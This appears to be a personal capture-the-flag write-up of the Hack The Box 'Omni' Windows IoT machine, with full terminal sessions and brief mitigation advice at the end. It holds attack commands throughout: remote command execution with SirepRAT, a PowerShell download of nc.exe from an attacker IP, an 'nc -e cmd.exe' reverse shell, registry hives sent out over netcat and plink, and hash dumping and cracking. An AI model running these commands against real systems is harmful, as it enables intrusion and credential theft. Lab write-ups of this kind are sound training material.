# Omni

```
root@kali:/home/kali/htb/Omni# nmap -p- -sV -sC 10.129.2.27 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-22 13:52 EDT
Nmap scan report for 10.129.2.27
Host is up (0.031s latency).
Not shown: 65529 filtered ports
PORT      STATE SERVICE  VERSION
135/tcp   open  msrpc    Microsoft Windows RPC
5985/tcp  open  upnp     Microsoft IIS httpd
8080/tcp  open  upnp     Microsoft IIS httpd
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Windows Device Portal
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
29817/tcp open  unknown
29819/tcp open  arcserve ARCserve Discovery
29820/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port29820-TCP:V=7.91%I=7%D=3/22%Time=6058D9DE%P=x86_64-pc-linux-gnu%r(N
SF:ULL,10,"\*LY\xa5\xfb`\x04G\xa9m\x1c\xc9}\xc8O\x12")%r(GenericLines,10,"
SF:\*LY\xa5\xfb`\x04G\xa9m\x1c\xc9}\xc8O\x12")%r(Help,10,"\*LY\xa5\xfb`\x0
SF:4G\xa9m\x1c\xc9}\xc8O\x12")%r(JavaRMI,10,"\*LY\xa5\xfb`\x04G\xa9m\x1c\x
SF:c9}\xc8O\x12");
Service Info: Host: PING; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 180.74 seconds

```

I run rpcdump, and get a ton of information. I wont sift through it all now, so I move on.

I need creds for the 8080 port, 5985 is windows remote. I google arcserve enumeration and find some exploits.

But I have no idea what version is running. 

```
root@kali:/home/kali/htb/Omni# searchsploit arcserve
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
ArcServe UDP 6.0.3792 Update 2 Build 516 - Unquoted Service Path Privilege Escalation                | windows/local/40335.txt
CA Arcserve D2D - GWT RPC Credential Information Disclosure (Metasploit)                             | windows/local/41707.rb
CA Arcserve D2D GWT RPC - Credential Information Disclosure (Metasploit)                             | jsp/webapps/17594.rb
CA ARCserve D2D r15 - Web Service Servlet Code Execution                                             | windows/remote/15869.txt
CA ARCserve D2D r15 GWT RPC - Multiple Vulnerabilities                                               | jsp/webapps/17574.php
CA BrightStor ARCserve - 'lgserver.exe' Remote Stack Overflow                                        | windows/remote/3244.py
CA BrightStor ARCserve - 'msgeng.exe' Remote Heap Overflow (1)                                       | windows/remote/3211.py
CA BrightStor ARCserve - 'msgeng.exe' Remote Heap Overflow (2)                                       | windows/remote/3218.pl
CA BrightStor ARCserve - 'msgeng.exe' Remote Stack Overflow                                          | windows/remote/3495.txt
CA BrightStor ARCserve - 'tapeeng.exe' Remote Buffer Overflow                                        | windows/remote/3086.py
CA BrightStor ArcServe - Media Service Stack Buffer Overflow (Metasploit)                            | windows/remote/16413.rb
CA BrightStor ARCserve - Message Engine Buffer Overflow (Metasploit)                                 | windows/remote/16418.rb
CA BrightStor ARCserve - Message Engine Heap Overflow (Metasploit)                                   | windows/remote/16401.rb
CA BrightStor ARCserve - Tape Engine Buffer Overflow (Metasploit)                                    | windows/remote/16407.rb
CA BrightStor ARCserve 11.5.2.0 - 'catirpc.dll' RPC Server Denial of Service                         | windows/dos/3248.rb
CA BrightStor ARCserve Backup - 'AddColumn()' ActiveX Buffer Overflow (Metasploit)                   | windows/remote/16577.rb
CA BrightStor ARCserve Backup - 'dsconfig.exe' Remote Buffer Overflow                                | windows/remote/1131.c
CA BrightStor ARCserve Backup - Message Engine/Tape Engine Remote Buffer Overflow                    | windows/dos/29444.pl
CA BrightStor ARCserve Backup - Remote Buffer Overflow (PoC)                                         | linux/dos/815.c
CA BrightStor ARCserve Backup - Remote Overflow                                                      | windows/remote/1132.c
CA BrightStor ARCserve Backup Agent - 'dbasqlr.exe' Remote Overflow                                  | windows/remote/1130.c
CA BrightStor ARCserve Backup r11.5 - ActiveX Remote Buffer Overflow                                 | windows/remote/5264.html
CA BrightStor ARCserve for Laptops & Desktops LGServer - 'rxsSetDataGrowthScheduleAndFilter' Remote  | windows/remote/16415.rb
CA BrightStor ARCserve for Laptops & Desktops LGServer - Multiple Commands Buffer Overflows (Metaspl | windows/remote/16416.rb
CA BrightStor ARCserve for Laptops & Desktops LGServer - Remote Buffer Overflow (Metasploit) (1)     | windows/remote/16400.rb
CA BrightStor ARCserve for Laptops & Desktops LGServer - Remote Buffer Overflow (Metasploit) (2)     | windows/remote/16409.rb
CA BrightStor ARCserve for Laptops & Desktops LGServer - Remote Buffer Overflow (Metasploit) (3)     | windows/remote/16411.rb
CA BrightStor ARCserve License Service - 'GCR NETWORK' Remote Buffer Overflow (Metasploit)           | windows/remote/16414.rb
CA BrightStor ARCserve Message Engine 0x72 - Remote Buffer Overflow (Metasploit)                     | windows/remote/16412.rb
CA BrightStor ARCserve Tape Engine - 0x8A Buffer Overflow (Metasploit)                               | windows/remote/16417.rb
Computer Associates ARCserve - REPORTREMOTEEXECUTECML Buffer Overflow (Metasploit)                   | windows/remote/16404.rb
Computer Associates ARCserve Backup Discovery Service Remote - Denial of Service                     | windows/dos/31707.txt
Computer Associates BrightStor ARCserve Backup 11.5 - mediasvr caloggerd Denial of Service           | windows/dos/30046.py
SCO Unixware 7.1/7.1.1 - ARCserver /tmp Symlink                                                      | sco/local/19752.txt
----------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
root@kali:/home/kali/htb/Omni# 
```

There is a lot of exploits, and few versions. 

I try to use a quick remote buffer overflow but it does not work. So I enumerate further.

the 8080 port states: 

```
http://10.129.2.27:8080 is requesting your username and password. The site says: “Windows Device Portal”
```

And I discover that Windows Device Portal is a Windows 10 IoT application: https://docs.microsoft.com/en-us/windows/iot-core/manage-your-device/deviceportal

I google Windows Device Portal enumeration and find a black hat pdf document: https://www.blackhat.com/docs/us-16/materials/us-16-Sabanal-Into-The-Core-In-Depth-Exploration-Of-Windows-10-IoT-Core-wp.pdf

Which is a great read. I then google Windows Device Portal Exploit, and find https://github.com/SafeBreach-Labs/SirepRAT.


I DL it and look through the documentation.

```
root@kali:/home/kali/htb/Omni# python /home/kali/SirepRAT/SirepRAT.py 10.129.2.27 GetSystemInformationFromDevice
<SystemInformationResult | type: 51, payload length: 32, kv: {'wProductType': 0, 'wServicePackMinor': 2, 'dwBuildNumber': 17763, 'dwOSVersionInfoSize': 0, 'dwMajorVersion': 10, 'wSuiteMask': 0, 'dwPlatformId': 2, 'wReserved': 0, 'wServicePackMajor': 1, 'dwMinorVersion': 0, 'szCSDVersion': 0}>
root@kali:/home/kali/htb/Omni# python /home/kali/SirepRAT/SirepRAT.py 10.129.2.27 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c echo {{userprofile}}"
<HResultResult | type: 1, payload length: 4, HResult: 0x0>
<OutputStreamResult | type: 11, payload length: 30, payload peek: 'C:\Data\Users\DefaultAccount'>
<ErrorStreamResult | type: 12, payload length: 4, payload peek: ''>
root@kali:/home/kali/htb/Omni# 
```

I tried uploading nc.exe with the PutFileOnDevice command, but I did not get any response when trying to run the file afterwards.

So I used powershell to download it:

```
root@kali:/home/kali/htb/Omni# python /home/kali/SirepRAT/SirepRAT.py 10.129.2.27 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "powershell" --args "-c IWR -uri http://10.10.14.51/nc.exe -OutFile C:\Temp\nc.exe" --vv
RECV:
00000000: 2A 4C 59 A5 FB 60 04 47  A9 6D 1C C9 7D C8 4F 12  *LY..`.G.m..}.O.
SEND:
00000000: 0A 00 00 00 D8 00 00 00  01 00 00 00 01 00 00 00  ................
00000010: 24 00 00 00 3A 00 00 00  5E 00 00 00 7A 00 00 00  $...:...^...z...
00000020: D8 00 00 00 00 00 00 00  00 00 00 00 3C 00 41 00  ............<.A.
00000030: 53 00 5F 00 4C 00 4F 00  47 00 47 00 45 00 44 00  S._.L.O.G.G.E.D.
00000040: 5F 00 4F 00 4E 00 5F 00  55 00 53 00 45 00 52 00  _.O.N._.U.S.E.R.
00000050: 3E 00 70 00 6F 00 77 00  65 00 72 00 73 00 68 00  >.p.o.w.e.r.s.h.
00000060: 65 00 6C 00 6C 00 2D 00  63 00 20 00 49 00 57 00  e.l.l.-.c. .I.W.
00000070: 52 00 20 00 2D 00 75 00  72 00 69 00 20 00 68 00  R. .-.u.r.i. .h.
00000080: 74 00 74 00 70 00 3A 00  2F 00 2F 00 31 00 30 00  t.t.p.:././.1.0.
00000090: 2E 00 31 00 30 00 2E 00  31 00 34 00 2E 00 35 00  ..1.0...1.4...5.
000000A0: 31 00 2F 00 6E 00 63 00  2E 00 65 00 78 00 65 00  1./.n.c...e.x.e.
000000B0: 20 00 2D 00 4F 00 75 00  74 00 46 00 69 00 6C 00   .-.O.u.t.F.i.l.
000000C0: 65 00 20 00 43 00 3A 00  5C 00 54 00 65 00 6D 00  e. .C.:.\.T.e.m.
000000D0: 70 00 5C 00 6E 00 63 00  2E 00 65 00 78 00 65 00  p.\.n.c...e.x.e.
RECV:
00000000: 00 00 00 00                                       ....
RECV:
00000000: 00 00 00 00                                       ....
<HResultResult | type: 1, payload length: 4, HResult: 0x0>
<ErrorStreamResult | type: 12, payload length: 4, payload peek: ''>
root@kali:/home/kali/htb/Omni# python /home/kali/SirepRAT/SirepRAT.py 10.129.2.27 LaunchCommandWithOutput --return_output  --cmd "C:\Windows\system32\cmd.exe" --args "/c C:\Temp\nc.exe 10.10.14.51 1337 -e cmd.exe" --vv
RECV:
00000000: 2A 4C 59 A5 FB 60 04 47  A9 6D 1C C9 7D C8 4F 12  *LY..`.G.m..}.O.
SEND:
00000000: 0A 00 00 00 B4 00 00 00  01 00 00 00 01 00 00 00  ................
00000010: 24 00 00 00 36 00 00 00  5A 00 00 00 5A 00 00 00  $...6...Z...Z...
00000020: B4 00 00 00 00 00 00 00  00 00 00 00 43 00 3A 00  ............C.:.
00000030: 5C 00 57 00 69 00 6E 00  64 00 6F 00 77 00 73 00  \.W.i.n.d.o.w.s.
00000040: 5C 00 73 00 79 00 73 00  74 00 65 00 6D 00 33 00  \.s.y.s.t.e.m.3.
00000050: 32 00 5C 00 63 00 6D 00  64 00 2E 00 65 00 78 00  2.\.c.m.d...e.x.
00000060: 65 00 2F 00 63 00 20 00  43 00 3A 00 5C 00 54 00  e./.c. .C.:.\.T.
00000070: 65 00 6D 00 70 00 5C 00  6E 00 63 00 2E 00 65 00  e.m.p.\.n.c...e.
00000080: 78 00 65 00 20 00 31 00  30 00 2E 00 31 00 30 00  x.e. .1.0...1.0.
00000090: 2E 00 31 00 34 00 2E 00  35 00 31 00 20 00 31 00  ..1.4...5.1. .1.
000000A0: 33 00 33 00 37 00 20 00  2D 00 65 00 20 00 63 00  3.3.7. .-.e. .c.
000000B0: 6D 00 64 00 2E 00 65 00  78 00 65 00              m.d...e.x.e.
RECV:
00000000: 00 00 00 00                                       ....
RECV:
00000000: 54 68 69 73 20 76 65 72  73 69 6F 6E 20 6F 66 20  This version of 
00000010: 43 3A 5C 54 65 6D 70 5C  6E 63 2E 65 78 65 20 69  C:\Temp\nc.exe i
00000020: 73 20 6E 6F 74 20 63 6F  6D 70 61 74 69 62 6C 65  s not compatible
00000030: 20 77 69 74 68 20 74 68  65 20 76 65 72 73 69 6F   with the versio
00000040: 6E 20 6F 66 20 57 69 6E  64 6F 77 73 20 79 6F 75  n of Windows you
00000050: 27 72 65 20 72 75 6E 6E  69 6E 67 2E 20 43 68 65  're running. Che
00000060: 63 6B 20 79 6F 75 72 20  63 6F 6D 70 75 74 65 72  ck your computer
00000070: 27 73 20 73 79 73 74 65  6D 20 69 6E 66 6F 72 6D  's system inform
00000080: 61 74 69 6F 6E 20 61 6E  64 20 74 68 65 6E 20 63  ation and then c
00000090: 6F 6E 74 61 63 74 20 74  68 65 20 73 6F 66 74 77  ontact the softw
000000A0: 61 72 65 20 70 75 62 6C  69 73 68 65 72 2E 0D 0A  are publisher...
---------
This version of C:\Temp\nc.exe is not compatible with the version of Windows you're running. Check your computer's system information and then contact the software publisher.

---------
RECV:
00000000: 01 00 00 00                                       ....
<HResultResult | type: 1, payload length: 4, HResult: 0x0>
<OutputStreamResult | type: 11, payload length: 176, payload peek: 'This version of C:\Temp\nc.exe is not compatible w'>
<ErrorStreamResult | type: 12, payload length: 4, payload peek: ''>
root@kali:/home/kali/htb/Omni#
```

So I need a new nc.exe. I Have a nc64.exe lying on locally, but it didn't work either. I tried to connect with powershell as well, but nothing.

https://github.com/int0x33/nc.exe/blob/master/nc64.exe This one worked great.


```
root@kali:/home/kali/htb/Omni# rlwrap nc -nlvp 1337
Listening on 0.0.0.0 1337
Connection received on 10.129.2.27 49677
Microsoft Windows [Version 10.0.17763.107]
Copyright (c) Microsoft Corporation. All rights reserved.

whoami
whoami
'whoami' is not recognized as an internal or external command,
operable program or batch file.

C:\windows\system32>
```

I look around and eventually find some good stuff:

```
type iot-admin.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">omni\administrator</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa28853640000000002000000000010660000000100002000000000855856bea37267a6f9b37f9ebad14e910d62feb252fdc98a48634d18ae4ebe000000000e80000000020000200000000648cd59a0cc43932e3382b5197a1928ce91e87321c0d3d785232371222f554830000000b6205d1abb57026bc339694e42094fd7ad366fe93cbdf1c8c8e72949f56d7e84e40b92e90df02d635088d789ae52c0d640000000403cfe531963fc59aa5e15115091f6daf994d1afb3c2643c945f2f4b8f15859703650f2747a60cf9e70b56b91cebfab773d0ca89a57553ea1040af3ea3085c27</SS>
    </Props>
  </Obj>
</Objs>
C:\Data\Users\app>
 
```


I head over to my trusty friend https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters

And find the Secure string to plaintext section.

Unfortunately the decryption does not work. So I decide to port forward smb and look for some SAM hashes.

```
plink.exe -l root -pw kali -R 445:127.0.0.1:445 -P 4222 10.10.14.51
The server's host key is not cached in the registry. You
have no guarantee that the server is the computer you
think it is.
The server's ssh-ed25519 key fingerprint is:
ssh-ed25519 255 2b:90:c5:fe:d7:e3:6b:b9:b8:b0:4c:83:31:45:f1:28
If you trust this host, enter "y" to add the key to
PuTTY's cache and carry on connecting.
If you want to carry on connecting just once, without
adding the key to the cache, enter "n".
If you do not trust this host, press Return to abandon the
connection.
y
Using username "root".
root@kali:~# whoami
root
root@kali:~# 
```

I then try crackmapexec to see if I can get some SAM hashes:

```
root@kali:/home/kali/htb/Omni# cme smb 127.0.0.1 --sam
/usr/local/lib/python2.7/dist-packages/beautifulsoup4-4.8.2-py2.7.egg/bs4/element.py:16: UserWarning: The soupsieve package is not installed. CSS selectors cannot be used.
  'The soupsieve package is not installed. CSS selectors cannot be used.'
SMB         127.0.0.1       445    omni             [*] Windows 10.0 Build 17763 (name:omni) (domain:omni) (signing:False) (SMBv1:False)
root@kali:/home/kali/htb/Omni# 
```

I exit out of the port-forward, and then save the SAM and SYSTEM registry manually.

```
reg save HKLM\SAM SAM
reg save HKLM\SAM SAM
The operation completed successfully.

reg save HKLM\SYSTEM SYSTEM
reg save HKLM\SYSTEM SYSTEM
The operation completed successfully.

dir
dir
 Volume in drive C is MainOS
 Volume Serial Number is 3C37-C677

 Directory of C:\Temp

03/23/2021  01:28 AM    <DIR>          .
03/23/2021  01:28 AM    <DIR>          ..
03/23/2021  12:30 AM            65,536 evil.bat
03/23/2021  12:21 AM            36,528 nc.exe
03/23/2021  12:39 AM            45,272 nc64.exe
03/23/2021  01:19 AM           675,752 plink.exe
03/23/2021  12:23 AM               501 reverse.ps1
03/23/2021  01:28 AM            36,864 SAM
03/23/2021  01:28 AM        15,147,008 SYSTEM
               7 File(s)     16,007,461 bytes
               2 Dir(s)     558,837,760 bytes free

nc64.exe -w 3 10.10.14.51 1338 < SAM

nc64.exe -w 3 10.10.14.51 1338 < SYSTEM

```
I get the files with netcat, but both samdump2 and secretsdump fails.

Maybe the files got messed up in transit? I noticed the file sizes were different.

```
plink.exe root@10.10.14.51 -P 4222 -pw kali < sam "cat > /home/kali/htb/Omni/sam"

plink.exe root@10.10.14.51 -P 4222 -pw kali < system "cat > /home/kali/htb/Omni/system"

plink.exe root@10.10.14.51 -P 4222 -pw kali < security "cat > /home/kali/htb/Omni/security"

C:\Temp>
```

This method seems to work perfectly.

```
root@kali:/home/kali/htb/Omni# secretsdump.py -sam sam -system system -security security LOCAL 
Impacket v0.9.22.dev1+20200819.170651.b5fa089b - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x4a96b0f404fd37b862c07c2aa37853a5
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a01f16a7fa376962dbeb29a764a06f00:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:330fe4fd406f9d0180d67adb0b0dfa65:::
sshd:1000:aad3b435b51404eeaad3b435b51404ee:91ad590862916cdfd922475caed3acea:::
DevToolsUser:1002:aad3b435b51404eeaad3b435b51404ee:1b9ce6c5783785717e9bbb75ba5f9958:::
app:1003:aad3b435b51404eeaad3b435b51404ee:e3cb0651718ee9b4faffe19a51faff95:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xdc2beb4869328393b57ea9a28aeff84932c3e3ef
dpapi_userkey:0x6760a0b981e854b66007b33962764d5043f3d013
[*] NL$KM 
 0000   14 07 22 73 99 42 B0 ED  F5 11 9A 60 FD A1 10 EF   .."s.B.....`....
 0010   DF 19 3C 6C 22 F2 92 0C  34 B1 6D 78 CC A7 0D 14   ..<l"...4.mx....
 0020   02 7B 81 04 1E F6 1C 66  69 75 69 84 A7 31 53 26   .{.....fiui..1S&
 0030   A3 6B A9 C9 BF 18 A8 EF  10 36 DB C2 CC 27 73 3D   .k.......6...'s=
NL$KM:140722739942b0edf5119a60fda110efdf193c6c22f2920c34b16d78cca70d14027b81041ef61c6669756984a7315326a36ba9c9bf18a8ef1036dbc2cc27733d
[*] Cleaning up... 
root@kali:/home/kali/htb/Omni# vim hash
root@kali:/home/kali/htb/Omni# john hash -wordlist=/usr/share/wordlists/rockyou.txt --format=NT
Using default input encoding: UTF-8
Loaded 6 password hashes with no different salts (NT [MD4 256/256 AVX2 8x3])
Remaining 5 password hashes with no different salts
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
mesh5143         (app)
1g 0:00:00:00 DONE (2021-03-22 22:36) 1.041g/s 14941Kp/s 14941Kc/s 65604KC/s  _ 09..*7¡Vamos!
Warning: passwords printed above might not be all those cracked
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed
```

And we have creds of app:mesh5143

I also want to try to pass the hash with evil-winrm but it does not work. I can not log in as user app with evil-winrm either.

I log onto the web-server and find a Run Command interface in Processes.

I use this to get a reverse shell using the same nc64.exe binary as before. But this time it will be as user app, not as DefaultAccount.

Now I can revisit the PowerShellCredentials from earlier.


```
powershell

Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

$cred = Import-CliXml -Path iot-admin.xml; $cred.GetNetworkCredential() | Format-List *


UserName : administrator
Password : _1nt3rn37ofTh1nGz
Domain   : omni



PS C:\Data\Users\app> 

```

I open a new firefox window in private mode and log in with the administrator creds this time.

then I just repeat the netcat shell in the run command interface. And I receive the administrator shell:

```
root@kali:/home/kali# rlwrap nc -nlvp 1337
Listening on 0.0.0.0 1337
Connection received on 10.129.2.27 49719
Microsoft Windows [Version 10.0.17763.107]
Copyright (c) Microsoft Corporation. All rights reserved.

cd C:\Data\Users\administrator

type root.txt
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">flag</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb0100000011d9a9af9398c648be30a7dd764d1f3a000000000200000000001066000000010000200000004f4016524600b3914d83c0f88322cbed77ed3e3477dfdc9df1a2a5822021439b000000000e8000000002000020000000dd198d09b343e3b6fcb9900b77eb64372126aea207594bbe5bb76bf6ac5b57f4500000002e94c4a2d8f0079b37b33a75c6ca83efadabe077816aa2221ff887feb2aa08500f3cf8d8c5b445ba2815c5e9424926fca73fb4462a6a706406e3fc0d148b798c71052fc82db4c4be29ca8f78f0233464400000008537cfaacb6f689ea353aa5b44592cd4963acbf5c2418c31a49bb5c0e76fcc3692adc330a85e8d8d856b62f35d8692437c2f1b40ebbf5971cd260f738dada1a7</SS>
    </Props>
  </Obj>
</Objs>
C:\Data\Users\administrator>

```


## Comparing myself to the official writeup:

They find the Windows Device Portal And find the SirepRAT exploit.

Since the user has SYSTEM permissions, they extract the registry hives immediately.

They set up a writeable smb share. And create the registry backups before they copy them to the smb share.

they then use secretsdump.py to get the hashes and john to crack them.

They also try win-rm but get the same result as I did.

they find the run command interface on the web-server.

They simply run the powershell credentials decryption in the interface and log back in as an administrator.



## How to stop this exploit:

Make sure everything is up to date and patched. 

I believe that WDP has to run on the DefaultAccount, which has system privileges.

If possible, the account should not have any privileges it does not strictly need.

The IOT-admin administrator password was only reachable because the DefaultAccount had system privileges.

It is also worth noting that poor passwords made it incredibly easy to crack the user password.


